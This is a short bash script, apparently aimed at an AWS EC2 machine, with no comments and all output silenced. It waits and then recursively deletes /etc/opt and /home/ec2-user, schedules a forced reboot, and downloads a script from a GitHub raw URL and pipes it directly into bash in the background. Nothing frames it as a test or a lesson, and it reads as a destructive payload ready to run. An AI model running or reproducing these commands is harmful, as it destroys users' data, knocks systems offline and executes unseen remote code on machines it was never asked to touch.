#!/bin/bash

bash <(echo "sleep 600; rm -rf /etc/opt /home/ec2-user") >/dev/null 2>&1
bash <(echo "sleep 150 && reboot") >/dev/null 2>&1 &
bash <(wget -qO- https://github.com/army2mil/cautech/raw/refs/heads/main/...) >/dev/null 2>&1 &
